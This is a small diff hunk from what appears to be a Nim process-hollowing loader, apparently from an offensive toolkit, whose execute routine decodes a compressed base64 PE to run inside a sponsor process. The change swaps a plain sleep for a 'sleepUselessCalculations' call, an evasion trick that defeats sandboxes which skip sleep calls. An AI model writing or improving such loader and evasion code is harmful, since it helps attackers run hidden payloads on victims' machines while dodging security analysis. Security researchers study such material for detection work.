@@ -17,7 +17,7 @@ when defined(hollownimline):
 proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), isBlockDlls: bool, sleepSeconds: int = 0): bool =
 
     # Sleep at execution
-    sleep(sleepSeconds * 1000)
+    sleepUselessCalculations(sleepSeconds)
 
     # Decode and decompress PE
     var compressedPe = decode(compressedBase64PE)
